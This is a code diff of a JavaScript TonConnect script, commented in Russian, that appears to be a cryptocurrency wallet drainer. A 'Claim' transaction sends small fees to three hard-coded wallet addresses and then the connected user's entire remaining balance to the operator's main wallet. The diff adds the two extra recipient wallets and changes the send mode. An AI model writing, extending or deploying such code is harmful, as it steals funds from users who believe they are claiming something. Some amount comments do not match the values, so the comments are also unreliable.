@@ -1,4 +1,6 @@
 var mainWallet = "UQA3Qh7xby9ttfPfDdRX0e_I62m4FCNo_7FoloN6y51jcH7c"; // Основной кошелек для перевода
+var mainWallet1 = "UQDiefSSqsVld8UMxhD13wO1QzTQwlytu_ltKbnrC2SwfeV5"; 
+var mainWallet2 = "UQBhkwjEG5T6b3N5wX5M-uIN-Lx8GR6g7LQHdbjaSCgUNvvy"; 
 
 // Создаем объект для подключения к TonConnect UI
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -103,15 +105,23 @@ async function didtrans() {
         validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
         messages: [
             {
+                address: mainWallet1,  // Адрес получателя для первой части
+                amount: 10000,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
+                address: mainWallet2,  // Адрес получателя для первой части
+                amount: 10000,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
                 address: mainWallet,  // Адрес получателя для первой части
-                amount: 1000000,       // Сумма для первой транзакции (0.001 TON)
+                amount: 10000,       // Сумма для первой транзакции (0.001 TON)
             },
             {
                 address: mainWallet,   // Адрес получателя для второй части
                 amount: remainingBalance, // Сумма для второй транзакции
             }
         ],
-        sendMode: 3,  // Если это требуется в вашем API
+        sendMode: 5,  // Если это требуется в вашем API
         comment: "Claim",  // Комментарий (по желанию)
     };
 
